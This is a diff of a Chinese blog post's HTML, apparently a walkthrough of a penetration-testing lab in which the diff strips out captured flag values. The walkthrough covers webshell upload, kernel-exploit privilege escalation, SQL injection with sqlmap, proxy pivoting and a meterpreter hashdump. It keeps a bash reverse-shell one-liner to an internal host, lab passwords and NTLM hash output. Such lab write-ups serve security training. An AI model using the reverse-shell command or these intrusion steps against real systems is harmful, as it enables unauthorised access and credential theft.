@@ -126,7 +126,7 @@ if (!doNotTrack) {
   <section class="pb-6 mb-3 border-bottom">
     <p>超长文慎点。靶场说大不大，就是搞了三天，一是网速，二是网速，三是网速的原因，还有就是经验的原因。至今未完，70分。</p>
 <p>​</p>
-<p><img src="https://i.loli.net/2020/03/01/caJAsGi3SHNY86x.png" alt="拓扑.png"></p>
+<p><img src="https://i.loli.net/2020/03/04/y64OelnGXBIN1xH.png" alt="拓扑.png"></p>
 <h2 id="web服务">WEB服务</h2>
 <p>当前攻击机Kali，在192.168.11.0/24网段，有一台192.168.11.4的网站服务器。</p>
 <p><img src="https://i.loli.net/2020/02/29/ZqzeSdu4EpLDiGR.png" alt="11_4_Web_index.png"></p>
@@ -140,7 +140,7 @@ if (!doNotTrack) {
 <p>成功验证，getwebshell。</p>
 <p><img src="https://i.loli.net/2020/02/29/mDfBFHAWrPyjRS1.png" alt="11_4_Web_file_include_get_webshell.png"></p>
 <p>​</p>
-<p>得到flag1  flag{171b4706-0064-4f38-b617-c95c191958a9}</p>
+<p>得到flag1</p>
 <p><img src="https://i.loli.net/2020/02/29/odsFB8z6qDH5lgQ.png" alt="11_4_Web_get_flag1.png"></p>
 <p>​</p>
 <p>先反弹靶机的shell，蚁剑-虚拟终端输入：</p>
@@ -153,7 +153,7 @@ if (!doNotTrack) {
 <p><img src="https://i.loli.net/2020/02/29/JIbFglPpOznrNXK.png" alt="11_4_upload_exp.png"></p>
 <p>根据 <code>phpinfo()</code> 或 <code>uname -a</code> 获知linux内核版本，上传对应可用 Exp 提权。</p>
 <p><img src="https://i.loli.net/2020/02/29/pZLyY9lJ6qK7hSH.png" alt="11_4_upgrade_privilge.png"></p>
-<p>获得flag2   flag{fab35715-9b53-477e-ab3c-08fa42e7d3db}</p>
+<p>获得flag2</p>
 <p><img src="https://i.loli.net/2020/02/29/8fRVY1NiK2aEOr9.png" alt="11_4_Web_get_flag2.png"></p>
 <p>​</p>
 <p>后续渗透，查看主机的网卡，多网卡就是边界机/跳板。</p>
@@ -184,7 +184,7 @@ if (!doNotTrack) {
 <p>单引号、逻辑判断等常规测试后，确认是数字型UNION注入</p>
 <p><img src="https://i.loli.net/2020/02/29/XZBxswKijRJr1UD.png" alt="12_103_oa_sql_inject_union.png"></p>
 <p>​</p>
-<p>使用sqlmap，dump所有的表。获得flag3  flag{9597b462fe22}</p>
+<p>使用sqlmap，dump所有的表。获得flag3</p>
 <p>还有一个admin账户密码，md5解密，竟然要收费，灵机一动，直接google这个md5。</p>
 <p>ok，有博客分享出来了，MD5 =&gt;29acd667cdbee1116d365727ca6821d3，明文=&gt;37s984pass，没看出特殊含义，能解出来就好吧。</p>
 <p><img src="https://i.loli.net/2020/02/29/lqd2hu9AsYxk13B.png" alt="12_103_oa_flag3.png"></p>
@@ -199,7 +199,7 @@ if (!doNotTrack) {
 <p>连接蚁剑，记得先添加代理。</p>
 <p><img src="https://i.loli.net/2020/02/29/wWsFn1XEANHQRgZ.png" alt="12_103_oa_get_webshell_antsword.png"></p>
 <p>​</p>
-<p>得到flag4  flag{3d9a2e33-0f0a-41de-ae9f-fa138abc0f70}</p>
+<p>得到flag4</p>
 <p><img src="https://i.loli.net/2020/02/29/fkQ3UxHJlLC5Z1S.png" alt="12_103_oa_flag4.png"></p>
 <p>​</p>
 <p>然后查看网页配置文件，发现数据库账号密码（其实已经没有大作用，先前已经扫荡过了），主要是发现一个邮箱账号密码，与后续的邮件网站有关。</p>
@@ -231,7 +231,7 @@ if (!doNotTrack) {
 <p><img src="https://i.loli.net/2020/02/29/C7PsHYwVXTFgDlE.png" alt="12_104_mail_manage_get_webshell.png"></p>
 <p>​</p>
 <p>问题：邮箱是关键，关键flag5在哪？？</p>
-<p>连接蚁剑，在网站目录找到flag6?   flag{3c6ea172-7c27-438f-b440-e71f99a59b37}</p>
+<p>连接蚁剑，在网站目录找到flag6</p>
 <p>数据库账户 MyDB(&ldquo;127.0.0.1&rdquo;,&ldquo;mail&rdquo;,&ldquo;mail123456&rdquo;,&ldquo;my_mail&rdquo;);</p>
 <p>​</p>
 <p>接着提权，本来打算上传Ubuntu3.16有效的Exp到 upload目录执行，但是提示 <code>no such file or directory</code>，搜索一下问题，大概就是Exp的架构跟Linux架构位数不一样或者其他问题。</p>
@@ -255,7 +255,7 @@ if (!doNotTrack) {
 <p>连接Cknife，因为我的刀版本低，不支持代理，所以 JVM运行时配置Socks代理，选项会默认端口1080</p>
 <div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">java -DsocksProxyHost<span class="o">=</span>192.168.11.3 -jar Cknife.jar
 </code></pre></div><p>​</p>
-<p>cat /root/flag 得到 flag7  flag{02541512-d87c-4d13-bae8-4a9ad0ce2780}</p>
+<p>cat /root/flag 得到 flag7</p>
 <p><img src="https://i.loli.net/2020/03/01/crv6ypHuQVZwKqX.png" alt="12_104_mail_tomcat_shell_flag7.png"></p>
 <p>现在就可以反弹出一个root权限的shell，反弹到WEB服务器<code>172.16.12.102</code>。ubuntu低版本sh对bash有点兼容问题，搜了一下，将bash反弹语句作了改进。</p>
 <div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">bash -c <span class="s1">&#39;bash -i 1&gt;&amp;/dev/tcp/172.16.12.102/8104 0&gt;&amp;1&#39;</span>
@@ -313,11 +313,11 @@ run
 <p>卡死。后会有期。</p>
 <p>​</p>
 <h2 id="继续渗透">继续渗透</h2>
-<p>大家好，我已经没什么心气了。但却也更轻车熟路地，重复还原到这一步，再Fuzz。</p>
-<p>flag8 flag{10.15.0.4}</p>
+<p>大家好，我已经没什么心机了。但却也更轻车熟路地，重复还原到这一步，再Fuzz。</p>
+<p>flag8</p>
 <p>发现10.15.0.4的远程桌面登录，使用admin\2_333admin登录成功。</p>
 <p>提权，查看管理员桌面，获得flag9</p>
-<p>flag9 flag{13b69f33-f205-436b-8c41-ccda0dff66e0}</p>
+<p>flag9</p>
 <p>获得10.15.0.4的meterpreter，hashdump，有一管理员Hash</p>
 <p>Administrator:500:aad3b435b51404eeaad3b435b51404ee:fbe6ba371645ed310bc9fac913c75cd6:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</p>
